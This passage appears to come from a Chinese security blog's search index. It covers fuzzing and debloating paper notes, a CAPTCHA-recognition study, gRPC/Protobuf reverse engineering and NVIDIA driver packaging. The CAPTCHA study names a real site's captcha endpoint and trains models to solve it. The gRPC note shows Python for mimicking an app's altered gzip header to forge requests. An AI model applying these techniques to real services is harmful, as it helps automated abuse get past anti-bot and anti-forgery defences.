llvm read_n1 = read(0, tmp, 4096); if (read_n1 == -1) goto link; else goto entry2; entry2: char* p = calloc(read_n1 + 1, 1); fuzzbuilder_buf = p; memcpy(p, tmp, read_n1); fuzzbuilder_size += read_n1; // load, add, store if (read_n1 == 4096) goto entry3; else goto link; } entry3: goto entry4; entry4: read_n2 = read(0, tmp, 4096); if (read_n2 == -1) goto link; else goto entry5; entry5: char *p2 = calloc(fuzzbuilder_size + read_n2 + 1, 1); memcpy(p2, fuzzbuilder_buf, fuzzbuilder_size); memcpy(p2 + fuzzbuilder_size, tmp, read_n2); free(fuzzbuilder_buf); fuzzbuilder_buf = p2; fuzzbuilder_size += read_n2; if (read_n2 == 4096) goto entry4; else goto link; link: // original code ...  再将分支跳转简化为如下循环：\nchar* fuzzbuilder_buf; int fuzzbuilder_size; int main() { char *tmp = alloca(4096); int read_n; while((read_n = read(0, tmp, 4096)) != -1) { char * p = calloc(fuzzbuilder_size + read_n + 1, 1); memcpy(p, fuzzbuilder_buf, fuzzbuilder_size); // 1st: memcpy(p, 0, 0) memcpy(p + fuzzbuilder_size, tmp, read_n); free(fuzzbuider_buf); fuzzbuilder_buf = p; fuzzbuilder_size += read_n; if (read_n != 4096) break; } // original code ... }  接着 insert_fuzz_to_tests(targets)，对每个 function（变量名是 targets 但实际上是单元测试中的 test_ABC 而非 library 中的 FA）进行 IRWriter::fuzz()，遍历 function 中的所有 CallInst 和 InvokeInst，若 inst-\u0026gt;getCalledFuncion() 即 callee 在 targets 中则将 inst 加入集合，最后遍历集合中的 inst，读取配置中对应 target 的 fuzz 和 len 参数位置，用 gv_buf 和 gv_s 分别替换，即调用 inst-\u0026gt;setArgOperand(idx, \u0026amp;v)，这样 test_XX 中对 FA 的调用都被修改为传入 global buf 中的数据，也就是之前从 stdin 读入的数据，重新编译后就可以用 AFL 进行 fuzz 了。值得注意的是 IRWriter::fuzz() 中还把 __assert_fail 与 abort 全部移除了，论文中只在末尾 Discussion 处提到，可能是后来实现的。\n此外 insert_skip_to_tests(skips) 会遍历 skip functions，只处理返回类型为 void 或 int 的，原有内容全部清除，直接返回 void 或 0\n效果验证 Experiment Design：\n The efficiency of generated seeds The effectiveness of generated executables The effectiveness of FuzzBuilder as a bug finding tool.  Metrics:\n Line coverage Number of discovered bugs  Comparative Evaluation: OSS_Fuzz\n相关讨论 Related Work 就是提了下 Greybox Fuzzing 和 OSS-Fuzz，Fuzz Builder 的好处在于能从单元测试的输入自动得到较有效的 seeds，并且也不像 Libfuzzer 那样要手写 fuzz 代码。\nFuture discussion:\n FA automation Optimization of generated executable Errors in unit test Expansion of input value types  个人感觉 errors in unit tests 是比较实际的，一些单元测试不会考虑 unexpected value 或者用 assert abort 来退出，这样 fuzzer 的输入很可能导致程序异常终止从而被视为 bug，但这不算 library 本身的 bug 所以导致 false alarm。\n个人总结 一句话概括就是 make unit test fuzzable，在 library FA 处插桩以收集单元测试的数据作为 seed，在测试代码的 entry 插桩以创建从 fuzzer 获取数据的 interface 并更改所有调用 FA 的指令使其传入来自 fuzzer 的全局 buf 数据，就得到了可供 fuzzer 运行的代码。\n论文前期铺垫了很多 Fuzzable API, Function Sequence 之类的概念设定，但 2.4 节之后引入 unit test 却没有很好地联系，感觉前后有些割裂。\n感谢作者公开了代码并尽可能地给出了使用示例，代码为 C++ 编写，使用了单例模式，整体较为清晰，但 IRReader 和 IRWriter 中函数似乎有些冗余，尤其是 targets = get_functions_to_fuzz() 的过程，加上变量命名为 targets 但其实是 tests，给理解造成障碍。\n原本的代码基于 LLVM 6.0，而自己机器已经到 LLVM 13 了，不想使用提供的 Docker 环境，于是入门了 LLVM IR 的基本概念，微改代码以适配 LLVM 的 API 变动，为了更好地在 VS Code 中调试还配置了 CodeLLDB。\n参考资料 LLVM Language Reference Manual\nThe Often Misunderstood GEP Instruction\nYoutube Tutorials\nLLVM 教程中文版\n","date":"2022-03-14T13:46:52Z","permalink":"https://chinggg.github.io/post/fuzzbuilder/","tags":["论文笔记","安全","Fuzz"],"title":"FuzzBuilder: 为 C/C++ library 自动构建灰盒模糊测试环境"},{"categories":["论文"],"contents":"基本信息 摘要：验证码是保护网站免受恶意攻击的一种常见机制，其中基于文本的验证码使用最为广泛。虽然机器学习技术已对其安全造成威胁，但现有的大多数攻击都耗时耗力，需要预处理图片或者大量人工标注数据。在这篇文章中，我们试图通过利用SimGAN使模拟验证码与真实验证码更加相似，从而训练出一个端到端的模型来识别真实验证码。然而，我们的实验结果不能表明SimGAN对准确性有任何积极影响。相反，转移学习中的微调过程才是关键因素，它仅凭一些有标签的真实图像就能大大提高模型性能。\n关键词：验证码识别，生成对抗网络，迁移学习\nAbstract: CAPTCHA is a common mechanism to protect websites from malicious computer bots, among which text-based captcha is the most widely used. While machine learning techniques have posed a threat to them, most of the existing attacks either require image preprocessing or a large number of manually labeled data, which is time-consuming. In this article, we try to train an end-to-end model to recognize real CAPTCHAs with just synthetic samples, by utilizing SimGAN to make simulated CAPTCHAs more similar to the real ones. However, our experiment results cannot show SimGAN have any positive impact on the accuracy. Instead, transfer learning, especially the fine-tuning process is the key factor which can improve the performance of the model significantly by just a few labeled real images.\nKeywords: Captcha Attack; Transfer Learning; Generative Adversarial Network\n引言 验证码的全称是全自动区分计算机和人类的图灵测试（Completely Automated Public Turing test to tell Computers and Human Apart，CAPTCHA），在2003年由路易斯·冯·安(Luis von Ahn)等提出，在互联网活动中起着重要作用，诸如在网站注册、登录和密码找回等环节中，验证码能有效抵御自动化攻击。 尽管验证码的新形态不断出现，原始的字符验证码仍然在被广泛应用，攻击方和防守方的不断对抗也在不断进行，字符形态的扭曲，连人类都不一定能准确识别。但随着深度学习的流行，识别方开始占据上风，利用 CNN 等神经网络训练的模型能达到很高的识别率。 然而基于监督学习的神经网络依赖于海量的标签数据，需要前期人工标注打码，成本高昂，而且模型的迁移性较差，一旦验证码生成方式改变，就需重新打码并训练模型。如何利用无标注的数据进行分类，自监督学习、半监督学习、伪标签，数据增强等手 本文综合利用人工合成的验证码和无标注的真实验证码来训练神经网络，对某网站的验证码样本进行识别，先是尝试训练 SimGAN[2] 让合成验证码学习到真实验证码的分布，但效果不佳。最终在发表于2020年的论文 Simple and Easy: Transfer Learning-Based Attacks to Text CAPTCHA[1] 中得到结论，使用 GAN 等方式试图让合成验证码更像真实验证码对准确性的提升没有较大影响，用少量标注过的真实验证码 finetune 预训练的神经网络才能大大提高准确率。\n验证码安全概述 验证码的种类与发展 按照信息类型的不同，现有的验证码可分为两类：一类是基于视觉的验证码，包括文本类验证码和图像类验证码；另一类是基于听觉的语音类验证码，基于视觉的验证码通过识别验证码中对象所属的类别实现验证，基于语音的验证码则匹配语音中包含的验证信息实现验证。 早期的验证码，都是基于人可以一目了然看懂文字，而不能轻易让程序实现分类而出发。然而，随着计算机发展的愈发智能和类人化，我们能否还能区分人与计算机？这是验证码的根本问题。Alpha Go 击败人类顶尖棋手让我们看到了 AI 在解决特定任务上的出色能力，为了不让验证码被自动化轻易程序识别，验证码的外在形态和任务逻辑早已变得非常复杂，长期对抗下来，就形成了机器人和用户都看不懂的尴尬局面，用户的体验成了这场战争中的牺牲品。所以业界也在尝试应用基于行为的新型验证码，将更多更强的风控 SDK 嵌入前端，从而依据滑动轨迹，浏览器特性，前端代码保护等能力，将对抗迁移到用户层迁移到了代码层，不再单纯依赖用户是否正确完成任务来进行判定，验证码对抗进入新的时代，不过这不是本文讨论的重点。\n文本型验证码的对抗 由于文本类验证码具有交互方式简单、密码空间大且场景适应性强等特点，在实际应用中被广泛接受．调查发现，在Alexa发布的全球综合排名前50的网站中，80％的网站在登陆、注册、输错密码或者密码找回环节中使用验证码来抵御自动化攻击，其中包含微软、百度等在内的 60% 的网站均在使用文本类验证码。[5]\n因此，深入研究文本类验证码的安全性对于改进传统验证码生成方法具有重要意义，本文研究对象及下文所提到的验证码皆为文本类验证码。\n最初的文本验证码仅仅只是手写字体样本标注的识别问题，比如下图中的验证码，曾经有一部分是取自历史书籍的截图，从而借网友之力标注文本的图书馆转为电子档。\n这种验证码，易于切割文字清晰，很快就能被破解。目前，文本验证码的安全性主要靠背景干扰信息和字符粘连两个因素来进行保证，这两个安全特征都在不同程度上增加了识别难度和分割难度。除此之外还有中文和动态 GIF 验证码来增加分类数量或提高定位难度，但可能影响用户体验，所以常见的码仍以字符重叠、扭曲、倾斜和偏移为主。\n传统方法识别文本型验证码的步骤如下：首先，通过二值化、空间滤波、变换等图像处理技术去除验证码中的干扰信息。其次，使用投影、类聚或目标检测等方法确定字符在图像中的位置并进行分割。最后，利用SVM、KNN等机器学习方法提取字符特征并进行分类识别。[6]\n基于神经网络的深度学习方法则无需繁琐的图像预处理步骤，强大的神经网络可以进行端到端的学习预测，但模型的解释性较差，且需要大量标注样本。\n基于SimGAN的生成对抗网络 生成对抗网络 生成对抗网络（Generative Adversarial Networks，GAN）的诞生受到博弈论的启发，通过对抗训练的方式来使得生成网络产生的样本服从真实数据分布，其中博弈双方分别是判别网络（Discriminative Network）和生成网络（Generative Network），判别网络的目标是尽量准确地判断一个样本是来自于真实数据还是由生成网络产生，生成模型的目标是尽量生成判别网络无法区分来源的样本。这两个目标相反的网络不断地进行交替训练。当最后收敛时，如果判别网络再也无法判断出一个样本的来源，那么也就等价于生成网络可以生成符合真实数据分布的样本。\n判别网络𝐷(𝒙; 𝜙)的目标是区分出一个样本𝒙是来自于真实分布 𝑝𝑟(𝒙) 还是来自于生成模型 𝑝𝜃(𝒙)，因此判别网络实际上是一个二分类的分类器．用标签𝑦 = 1来表示样本来自真实分布，𝑦 = 0表示样本来自生成模型，判别网络𝐷(𝒙; 𝜙)的输出为𝒙属于真实数据分布的概率，即𝑝(𝑦 = 1|𝒙) = 𝐷(𝒙; 𝜙), 则样本来自生成模型的概率为𝑝(𝑦 = 0|𝒙) = 1 − 𝐷(𝒙; 𝜙)\n给定一个样本(𝒙,𝑦)，𝑦 = {1,0}表示其来自于𝑝𝑟(𝒙)还是𝑝𝜃(𝒙)，判别网络的目标函数为最小化交叉熵，即\n生成网络的目标刚好和判别网络相反，即让判别网络将自己生成的样本判别为真实样本\n上面的这两个目标函数是等价的．但是在实际训练时，一般使用前者，因为其梯度性质更好。\nSimGAN论文解读 SimGAN 是苹果公司的首篇 AI 论文，获得了2017年的 CVPR 最佳论文奖，论文全名是 Learning from Simulated and Unsupervised Images through Adversarial Training，即使用「模拟+无监督」的学习方法，通过没有标签的真实图片来提高仿真器生成图片的真实性，同时还保持原有合成图片的标签，最终得到一批带标签的，真实的图像数据集。\n论文中构建了如上图所示的 GAN 网络，简称 SimGAN 。经典的GAN是先从标准正态分布开始逐步接近训练数据的分布，而在 SimGAN 中则是模拟器生成一批带标签的合成图片，然后将合成图片送入到修正器 Refiner 中，Refiner 学习真实图像的一些特征，对合成图像进行修正，得到修正后的图像与未标注的真实图像一同送入分辨器中。如果分辨器将修正后的图像判别为真实，则固定 Refiner 的参数不变，根据损失函数，反向传播来优化分辨器的参数；如果判别为假，则固定分辨器的参数，对 Refiner 的参数进行优化。\n上述公式表示 Discriminator 用来更新参数的损失，其中 $\\tilde{x} _i$ 表示合成图片, $y_j$ 表示真实图片，Dφ是输入为合成图片的概率，1-Dφ是输入为真实图片的概率，其实就是二分类交叉熵损失函数。\n上述公式表示 Refiner 需要同时最小化两个损失来更新参数，其中 $l_{real}$ 是合成图片与真实图片y之间的差异，第二部分$l_{reg}$是修改过后的图像与原合成图像的差异。\nRefiner 要最小化$l_{real}$，即尽可能让 Discriminato r将合成图像误分类为真实图像，最小化$l_reg$是为了惩罚修正后的图像和原始图像之间的巨大差别，避免 Refiner 在修正合成图片的时候用力过猛修改了图像的内容，这也是本文相比于经典 GAN 的一个创新点。\n还有一个创新点作者定义的 Discriminator 是局部分辨器而非全局分辨器。将输入分辨器的图像进行分割，将其分成 w*h 的小块，逐块的送入分辨器中，这样限制了接受域的大小，避免了 Refiner 过分强调对某一部分的修正来欺骗分辨器，而且这样分块之后一幅图像对应着 w*h 个样本，丰富了样本的数量。\n在无标注真实验证码上的实验 验证码的选取与合成 真实验证码来自 https://passport.bilibili.com/web/captcha/img，每次访问该地址都会随机更新图片且没有频率限制。观察发现该验证码的长度为5，所用字符集为大写字母及数字，颜色均为黑白，没有背景噪音且扰动规律较明显，即字符统一向左或向右倾斜一定角度，略有扭曲，且有一长一短两条线划过字符。\n为生成与之相似的验证码，使用了 wheezy.captcha 以合成带有干扰线和扭曲的验证码，共计生成十万余张，真实验证码与最终生成验证码对比如下：\n网络的构建与训练 本文构建了三个不同的神经网络，即用于从图片识别验证码文本的 Recognizer，判断验证码是否为合成的 Discriminator 和对合成验证码进行修改的Refiner。\nRecognizer即用于图像分类的神经网络，我们期望得到的分类结果是验证码字符串，但网络的输出只有数字，因此手动实现了 one hot 编码，网络最后一层输出的大小即为 串长*字符集长度，将其进行一些 reshape 操作即可解码为字符串。在具体网络模型的选择上，最开始仅选用了三层的 CNN 网络，虽然训练较快，20个 epoch 后就能达到90%左右的准确率，但后续实验表明其泛化能力差，在真实验证码上的准确率不理想，后来受论文的启发替换为 ResNet101，训练了不到10个 epoch 就达到了接近99%的准确率。\nDiscriminator 也是 CNN 网络，是一个二分类器，区分一个验证码是我们合成的还是真实的样本集。\nRefiner 是一个 ResNet，输入尺寸与输出尺寸相同，它在像素维度上去修改我们生成的图片，而不是整体的修改图片内容，这样才可以保留整体图片的结构和标注。\nGAN的训练最为关键也最为困难，官方没有公开自己的训练代码，仅有如下算法描述，大致框架与经典的GAN相同。\n上图中 Refiner 和 Discriminator 都是选用了 SGD 作为优化算法，而参考了一些网上复现的代码，Refiner 都改用了 Adam，Kg和Kd的选取也需要大量微调，除此之外论文中还使用了一些 trick，比如设置了一个缓存区来存储分辨过的修正后图像，每次向分辨器送入一批次图像时总是从缓存中选取一部分共同参与训练，这样做的好处就是可以避免修正器重新引入了被分辨器遗忘的伪迹，并且避免训练发散。\n交替训练了500个step后，用Refiner修改后的图片只是变得模糊，似乎并没有更接近真实图片。\n效果验证 由于没有时间手动标注真实验证码，所以本文不会计算准确率，而是随机挑选样本中的单张真实验证码图片进行预测，反复几次后既能直观地估计其效果。\n预测真实验证码使用了三种方法：直接使用合成验证码训练出的Recognizer对真实图片进行预测；使用Refiner修改后的图片训练Recognizer对真实图片进行预测；用Refiner修改输入的真实图片再让Recognizer进行预测\n从结果看使用GAN训练的Refiner对提升识别准确率并没有帮助，Recognizer模型本身的选取反而有较大影响，开始仅使用了三层CNN网络，根本无法用于识别真实验证码，换用ResNet101后，如上左图所示，仅在合成验证码上训练过却偶然能识别正确4个字符。而另两张图表明引入Refiner后并没有可感的提升。这里能识别出部分字符应该主要是靠ResNet101的强大学习能力和手工合成验证码的一定相似度，GAN并没有发挥作用。\n基于迁移学习的改进方法 迁移学习的基本概念 上述实验用合成图片去训练模型，并试图让其在真实图片上达到较高准确率，实际上有违深度学习的通常假设，即训练数据与测试数据在相同的特征空间且拥有相似的分布。但收集标注样本的成本太高，现实生活中测试样本往往是不太充足的，如果模型也能像人类学习那样利用已有的知识对不同任务举一反三，触类旁通，则只需标注少量的数据即可，迁移学习的概念正是由此引出。\n在迁移学习中，有两个基本的概念：领域 (Domain) 和任务 (Task)。[4]\n领域 (Domain): 是进行学习的主体，主要由两部分构成：数据和生成这些数据的概率分布。通常我们用花体 D 来表示一个 domain，用大写斜体 P 来表示一个概率分布。特别地，因为涉及到迁移，所以对应于两个基本的领域：源域 (Source Domain) 和目标域 (Target Domain)。源域 $D_s$就是有知识、有大量数据标注的领域，是我们要迁移的对象；目标域 $D_t$ 就是我们最终要赋予知识、赋予标注的对象。知识从源域传递到目标域，就完成了迁移。\n任务 (Task): 是学习的目标。任务主要由两部分组成：标签和标签对应的函数。通常用花体 Y 来表示一个标签空间，用 $f(·)$ 来表示一个学习函数。 相应地，源域和目标域的类别空间就可以分别表示为 $Y_s$ 和 $Y_t$。我们用小写 $y_s$ 和 $y_t$ 分别表示源域和目标域的实际类别。\n迁移学习 (Transfer Learning): 给定一个有标记的源域 $ D_s={ \\lbrace x_i , y_i \\rbrace }{i=1}^n $ 和一个无标记的目标域 $D_t= {\\lbrace x_j \\rbrace}^{n+m}{j=n+1}$。这两个领域的数据分布 $P(X_s)$ 和 $P(X_t)$ 不同，即 P(xs)≠P(xt)。迁移学习的目的就是要借助 Ds 的知识，来学习目标域 Dt 的知识 (标签)。\n迁移学习在不同合成样本上的效果 本文先前实验中使用了SimGAN但效果不佳，GAN是否真的能让合成验证码学习到真实验证码的属性？论文[1]解答了我的疑问。作者对25种验证码进行了实验，最终得出结论，使用GAN去精炼合成后的样本以让其更像真实样本并不能对结果有较大提升，而迁移学习最后使用少量样本的 fine-tuning 环节才是关键所在。论文中识别验证码的整体方法流程如下图所示：\n本文先前的尝试由于没有标注任何真实验证码，因此只对应了前两步，即合成验证码并使用其作为样本来预训练一个基本的模型，而没有最后的微调环节。还有一点不同之处需要注意，此处合成的验证码均为最常规的形状，并不追求与真实验证码有任何相似，fine-tuning 前后的识别成功率如下表所示，可以看到尽管之前识别率极低，但 fine-tuning 后表现都极为出色。\n之前的相关工作往往费尽心思让合成的验证码更像真实验证码，甚至用上类似 SimGAN 的深度学习方法，而论文作者对此表示怀疑，为了分析合成验证码与真实验证码在外观上的相似度对识别率的影响，作者先是用传统的图像处理方法手工模拟得相似的验证码，再利用 GAN 试图让手工合成的验证码更像真实验证码，并分别进行实验，下图分别为手工模拟和 GAN 调整后的结果：\n左图中第一栏第二种验证码正是本文先前尝试攻击的对象，可以看出手工调整后的验证码风格与真实验证码十分接近。而右图中 SimGAN 在肉眼上并未产生使人信服的修改效果，甚至随着训练次数增加图片可能越来越模糊以至无法辨认。\n上两张表的实验结果表明，只用手工合成的相似验证码去预训练有一部分亦能达到可观的准确率，而用 GAN 继续拟合对准确率没有明显的正面影响。\n因此论文作者得出了两个结论：花费时间让合成的验证码更像真实验证码对迁移学习来说是多余的无用功，最后的 fine-tuning 环节才是关键；文本型验证码确实不再安全，只需手工标注几百张样本即可以通过迁移学习达到较高的准确率。\n总结与展望 由于工作中时常遇到验证码相关的风控对抗，故选择了验证码识别这一课题，在有大量标注数据的情况下其实只需套用 SOTA 模型即可。但如 Yann LeCun 所指出，无监督学习或者说自监督学习才是最大的蛋糕，所以本文坚持不手动标注真实验证码，而尝试利用 SimGAN 增强过的合成数据实现无标注的验证码识别，最开始效果完全无法接受。后来受到论文[1]启发换用了 ResNet101 作为识别模型，识别结果更加可靠。但此文也已经用实验证实了用 GAN 去增加合成数据与真实样本之间的相似程度并不能提升识别准确率，要想达到高可用的结果仍然需要少量有标签的样本进行迁移学习。\n参考文献 [1]\tWang, Ping, et al. \u0026ldquo;Simple and easy: Transfer learning-based attacks to text CAPTCHA.\u0026rdquo; IEEE Access 8 (2020): 59044-59058.\n[2]\tShrivastava, Ashish, et al. \u0026ldquo;Learning from simulated and unsupervised images through adversarial training.\u0026rdquo; Proceedings of the IEEE conference on computer vision and pattern recognition. 2017.\n[3]\tYe, Guixin, et al. \u0026ldquo;Yet another text captcha solver: A generative adversarial network based approach.\u0026rdquo; Proceedings of the 2018 ACM SIGSAC Conference on Computer and Communications Security. 2018.\n[4]\tJindon Wang et al., . \u0026ldquo;Transfer Learning Tutorial.\u0026rdquo; (2018).\n[5]\t汤战勇,田超雄,叶贵鑫,李婧,王薇,龚晓庆,陈晓江,房鼎益.一种基于条件生成式对抗网络的文本类验证码识别方法[J].计算机学报,2020,43(08):1572-1588.\n[6]\t曹廷荣,陆玲,龚燕红,贾惠珍.基于对抗网络的验证码识别方法[J].计算机工程与应用,2020,56(08):199-204.\n","date":"2022-03-05T13:46:52Z","permalink":"https://chinggg.github.io/post/captcha-ml/","tags":["课程论文","安全","AI"],"title":"End-to-End Captcha Recognition With Few Labels: From SimGAN to Transfer Learning"},{"categories":["论文"],"contents":"RAZOR: software debloating 论文信息 原文作者：Chenxiong Qian, Hong Hu, Mansour Alharthi, Pak Ho Chung, Taesoo Kim, and Wenke Lee, Georgia Institute of Technology\n原文标题：RAZOR: A Framework for Post-deployment Software Debloating\n发表会议：USENIX SECURITY \u0026lsquo;19\n原文链接：https://www.usenix.org/system/files/sec19-qian.pdf\n代码链接：https://github.com/cxreet/razor\n问题背景 商业软件的功能越做越多，终端用户只用到一小部分，软件往往显得臃肿，这不仅浪费耗费系统资源，还带来了更多攻击面，而 software debloating 可以解决此问题。\n但以往的工作需要获取软件源码，而用户往往只有分发部署后的二进制程序，且不同用户所需的功能各异，所以 post-deployment 软件更加具有实际效用。\npost-deployment software debloating 有以下两个挑战：\n 如何让不了解软件内部的用户选择要保留和移除的功能 如何修改二进制程序，在删除无用功能的同时保留所需  对于第一个挑战，可以让用户提供输入样例，但即使输入完全相同，多次执行时也可能产生不同的程序执行路径，所以要识别出 necessary-but-not-executed 的那部分程序，即 related-code，很难获得完全正确的答案，所以作者使用了启发式的方法，以四个层次递进，逐步扩大覆盖范围。\n对于第二个挑战，收集完 related-code 后，就可以重写二进制程序，通用的二进制重写依赖于可靠的反汇编结果和完整的 CFG，故而较为困难。对于 software debloating 而言仅需重写要执行的那部分功能，通过 trace 就可获得 CFG，因而可以实现二进制重写。\n系统设计 如图所示，即 Tracer, Path Finder 和 Generator\nExecution Trace Collection Tracer 以所给测试数据执行程序，记录三种控制流信息：\n Executed instructions (memory addr \u0026amp; raw bytes) Conditional Branches Indirect Calls/Jumps  Instruction-level recording 可以应对动态生成的代码，但效率不高，考虑到现实中的程序大多只有静态的代码，所以 Tracer 先从 basic block level 开始记录，检测到疑似动态代码生成的特征再切换到 instruction level。\nTracer 综合运用了基于软件的工具 (Dynamorio) 与基于硬件的工具 (Intel PIN 和 Intel PT)，前者普适性好但性能较差，后者高效但无法保证信息完整，三种 trace 技术可能产生不同的程序执行，用户可以选择最适合的或合并 trace 结果来获得更好的代码覆盖度。\n收集完 trace 结果后，就能反汇编二进制程序并构建所需的部分 CFG。\nHeuristic-based Path Inference 由 Tracer 获得的 CFG，用启发式方法扩展 CFG，获得 related-code\n zCode，无新增指令，CFG 上只连边不加点 zCall, 无新函数调用，若 non-taken 分支不含任何 call 指令，则加进 CFG zLib, 无任何额外的库函数，若 non-taken 分支只 call 同 binary 的函数或已被 call 的库函数，则加进 CFG zFunc, 无不同功能的库函数，若 non-taken 分支 call 的外部函数不涉及新的 functionality，则加进 CFG  算法如下图所示\nDebloated Binary Synthesization  先将原始二进制程序按照 CFG 反汇编，生成包含所有必要指令的伪汇编(pseudo-assembly) 修改伪汇编创建有效的汇编文件，symbolize basic blocks, concretize indirect calls/jumps, and insert fault handling code 编译汇编文件成为包含必要的机器码的目标文件(object file) 复制目标文件中的机器码到原始二进制程序中一个新的代码段(code section) 修改新代码段来修复对原始代码和数据的所有引？ 设置原始代码段不可被执行，仍保留在 debloated 后的程序中（可能还会被读取？比如实现 switch 的 jump table）  具体实现 代码开源在 https://github.com/cxreet/razor\n有提供使用说明 https://github.com/cxreet/razor/wiki，从测试小程序到 coreutils 都有\ndocker pull chenxiong/razor:0.04 可以直接体验\n效果验证 3 个 benchmark，前两者用软件方式 trace，后两者用硬件方式 trace:\n 29 SPEC CPU2006，包含 12 个 C 程序，7 个 C++ 程序和10个 Fortran 程序 论文 CHISEL 中用到的 10 个 coreutils 程序 Firefox 和 FoxitReader  在以下五个方面和 CHISEL 对比：\n Code Reduction: 从精简效果上看 CHISEL 略胜一筹，但其影响程序鲁棒性 Functionality: RAZOR 使用启发式方法扩展 related-code 后，测试功能完全正常，CHISEL 则有 wrong operation, infinite loop, crash, missed output 等问题 Security: 选择一些 CVE，部分是可在对应 binary 上利用的，部分已经被修复。CHISEL 消除代码的策略激进，消除了更多 CVE 但导致一些原本已修复的 CVE 又可被利用，相比之下 RAZOR 更稳健。另外消除 ROP gadget 数量也是 CHISEL 略胜，因为 RAZOR 更关注防止 forward-edge control-flow attack，这种攻击利用函数指针而不是返回地址 Performance: RAZOR 的构建速度在秒级，远胜 CHISEL。运行时开销也平均只增加 1.7%，主要是由于 indirect call concretization Practicality: 在 Firefox 和 Foxit Reader 这两个大型应用上测试打开网页和 PDF，在启发式方法下都取得了不错的效果  讨论与相关工作 Best-effort inference: 启发式方法虽然不能保证 completeness 和 soundness，但广泛用于二进制分析和重写中\nControl-flow Integrity (CFI): 控制流完整性检测和 Software Debloating 其实是互相促进的，debloating 可实现粗粒度的 CFI，而 RAZOR 也利用了 binCFI 中的技术来做优化。\nRemoving original code: 其实目前 RAZOR 还保留原本的 code section 只是设成 read-only，因为其中的数据可能还会被读取，比如 llvm 会对 switch 语句在 code section 中生成 jump table，需要被 indirect jump 读取。要完全移除也可以先分析对 code section 的读取，再在重写时将数据 reloacate 到新的 data section 并更新相关代码来访问新的位置。\n相关工作有针对 library, source code, container, hardware 的 debloating，以及 delta debugging，在这些方面 RAZOR 也有可能提供新的思路。\n","date":"2022-02-08T13:46:52Z","permalink":"https://chinggg.github.io/post/razor/","tags":["论文笔记","安全"],"title":"RAZOR: Software Debloating"},{"categories":["安全"],"contents":"逆向时开始见到 gRPC 协议和 Protobuf 编码在私信、直播等领域使用，故记录之。\ngRPC 是基于 HTTP/2.0 来传输的，但 Fiddler 5 似乎尚不支持，在抓包某 App 时发现了神奇的现象，同样的功能，Fiddler 抓到了 HTTP/1.1 的请求，mitmproxy 抓到了 HTTP/2.0 的请求，URL 的 Path 相同而 Host 不一样，猜测是客户端做了 FallBack。\n抓到包后其实有两种选择，最开始我找到发请求的地点，闷头逆向 Java 层代码，打印数据（注意是否有类继承 com.google.protobuf.GeneratedMessageLite），一个个字段找生成的位置，但因为不熟悉客户端所用组件，往往耗时耗力找不到关键，而且考虑到之后的目标是正向构造请求，确定 proto 协议才是关键，与其往客户端实现层分析，不如直接从报文 body 着手。\nProtobuf 高效的一大原因在于其将字段名放在双方持有的 proto 中，传输的数据仅有 enum 编号，但数据本身的值却完全是可以解读的，protoc --decode_raw \u0026lt; file 就能打印出解析后的数据，也有在线网站，但我刚开始复制报文 body 却总是解析失败，mitmproxy 可选择以 protobuf 解码数据，却也失败，关键在于传输的是 Length-Prefixed-Message 而非直接是 protobuf，即第一个 byte 值为 1/0 表示是否压缩，再 4 byte (big endian) 表示消息长度，剩下的才是消息，而如果有压缩的话，还要再把消息解压缩，比如最常见的 gzip，其前 10 byte 又是压缩相关的头部信息，而 App 可能会刻意设置 gzip header 以防伪造，若非提前看到 哔哩哔哩视频和字幕接口分析 这篇文章，必然踩坑。\ndef gzip_compress(buf: bytes, bz=True) -\u0026gt; bytes: compressed = gzip.compress(buf) if bz: # special header compressed = compressed[:3] + bytes(7*[0]) + compressed[10:] return compressed def length_prefixed_enc(buf: bytes, compress: bool = True) -\u0026gt; bytes: buf = gzip_compress(buf) if compress else buf return struct.pack(\u0026quot;!bl\u0026quot;, compress, len(buf)) + buf def length_prefixed_dec(msg: bytes) -\u0026gt; bytes: compress, length = struct.unpack(\u0026quot;!bl\u0026quot;, msg[:5]) buf = gzip.decompress(msg[5:5+length]) if compress else msg[5:5+length] return buf  将 Protobuf 的原始数据提取出后，即可用 protoc 解得没有字段名的原始数据，配合动静态分析获得的值，一般就能手写对应的 proto 文件，接着就由 proto 文件生成不同语言的对应代码，可以尝试直接调用 gRPC，也可以仅生成 Protobuf 的 msg 对象再 SerializeToString()，生成 Length-Prefixed-Message 作为 body，添加 header \u0026quot;Content-Type\u0026quot;: \u0026quot;application/grpc\u0026quot;，这样构造 HTTP 请求亦可生效。\n","date":"2022-01-25T11:30:09+08:00","permalink":"https://chinggg.github.io/post/grpc-protobuf/","tags":["逆向","编码"],"title":"gRPC Protobuf 逆向初探"},{"categories":[""],"contents":"vps2arch 没啥好说的，上不了网注意改 systemd-networkd 的配置，提前 pacman -S vi vim base-devel\nNVIDIA nvidia 和 nvidia-lts 都是最新版 nvidia 驱动，一般内核新不是问题，往往是驱动太新，执行 nvidia-smi 后提示无法与 driv，lsmod | grep nvidia 没有结果，/dev 下也没有 nvidia，dmesg 才发现提示不支持。\n在官网查看对应型号显卡的最新驱动，记住版本号，比如 Tesla T4 是 470.82.01，若该型号官网驱动版本低于 nvidia，从 AUR 安装 nvidia-470xx-dkms 或 nvidia-390xx-dkms（其实 AUR 不止这些但以上两者是 Wiki 推荐)\n观察以上两个包的 PKGBUILD，发现都是从 https://download.nvidia.com/XFree86/Linux-x86_64/ 下载对应版本的 .run 文件，但直接执行 .run 文件不是 The Arch Way (容易滚挂？咱也没试过)，最好还是将 NVIDIA driver 纳入包管理器的控制，可以修改 PKGBUILD 中的 pkgver，自行打包 以安装任意版本的驱动，即 pacman -S devtools 后，执行 extra-x86_64-build 根据 PKGBUILD 创建干净的环境打包，再 pacman -U *.pkg.tar.zst 安装。若需要自行创建测试环境，可用 systemd-nspawn。\n为 NVIDIA 驱动打包，可参看 Listing of Installed Components 了解各文件的作用，.run 文件解压后也有 .manifest 简单列出路径和权限。另外 AUR 可参考的版本较少，可去 Manjaro GitLab 偷包，另外 diff -qr dir1/ dir2/ 可以比较不同驱动解压后目录中的文件异同，方便改包。\nvGPU 从 470xx 到 390xx，dmesg 日志都还是报错不支持，突然意识到机器是 vGPU 而非直通显卡，需要装 grid 驱动。可能是 license 的缘故，AUR 没有基于 grid 驱动的现成包，nvidia-merged 似乎是支持 vGPU 但安装提示本机并不是跑在 KVM 上的 vGPU，所以只能手打包。NVIDIA 官网没有提供 grid 驱动的公开直链，还好 Google Cloud 可以直接下载 NVIDIA-Linux-x86_64-${pkgver}-grid.run。\n基于 470xx 的 PKGBUILD 删减一通后居然打出了 470xx grid 的包，还真能装上，module 和 dev 都有了，nvidia-smi 不会立刻报错，而是等待许久后来一句 No devices were found，dmesg 